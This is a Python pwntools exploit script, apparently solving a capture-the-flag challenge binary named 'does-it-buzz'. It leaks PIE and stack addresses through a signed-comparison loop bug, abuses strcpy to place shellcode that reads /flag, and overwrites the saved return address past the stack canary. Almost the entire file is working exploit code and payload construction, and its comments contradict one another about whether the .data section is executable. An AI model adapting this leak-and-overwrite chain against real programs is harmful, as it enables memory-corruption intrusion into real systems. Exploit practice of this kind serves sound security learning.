from pwn import *

'''
1. use sign cmp to control loop
2. abuse strcpy() to write shellcode to .data section of binary (cause NX enabled and buffer overflow can not overwrite sip).
    NOTE: need binary address leak

    IMPORTANT: not reasonable, .data section is not executable
3. abuse strcpy() to overwrite sip (bypass canary) to that .data section with shellcode
    NOTE: need stack address leak
'''

context.binary = elf = ELF('/challenge/does-it-buzz', checksec = False)

io = elf.process()

loop_counter_offset = 0x38

leak_binaddr_payload = b'A' * loop_counter_offset + p32(constants.INT32_MAX * 2 + 1)

io.send(leak_binaddr_payload)

fizzbuzz_offset = 0x4098
io.recvuntil(leak_binaddr_payload)
pie_addr = u64(io.recvline(keepends = False).ljust(8, b'\x00'))
pie_base = pie_addr - fizzbuzz_offset
print(f'[=] pie base address: {hex(pie_base)}')

io.send(b'A' * loop_counter_offset + p32(4))

leak_stackaddr_payload = b'A' * loop_counter_offset + p32(constants.INT32_MAX * 2 + 1)
io.send(leak_stackaddr_payload)
io.recvuntil(leak_stackaddr_payload)
stack_addr = u64(io.recvline(keepends = False).ljust(8, b'\x00'))
print(f'[=] buffer address (+0x44): {hex(stack_addr)}')

bss_offset = 0x41c0
sc = asm(shellcraft.cat('/flag'))
assert b'\x00' not in sc # must be true, otherwise strcpy will failed write shellcode
assert len(sc) + 2 <= loop_counter_offset # +2 that skip first byte and last byte will be b'\x00' to eof strcpy()

buffer_shellcode_offset = 0x11 - 0x40 # 0x10 + 1, +1 that first byte will be overwrite to zero

shellcode_cpy_payload = b'A' + sc + b'\x00' + b'B' * (loop_counter_offset - len(sc) - 2) + p32(constants.INT32_MAX * 2 + 1) + p64(stack_addr + buffer_shellcode_offset) + p64(pie_base + bss_offset)
assert len(shellcode_cpy_payload) < 0x50
print(f'[=] shellcode payload length: {len(shellcode_cpy_payload)}')

io.send(shellcode_cpy_payload)

buffer_sip_offset = 0x74 - 0x40
sip_payload = b'A' + p64(pie_base + bss_offset) + b'B' * (loop_counter_offset - 9) + p32(16) + p64(stack_addr + buffer_shellcode_offset) + p64(stack_addr + buffer_sip_offset)

io.send(sip_payload)

io.interactive()
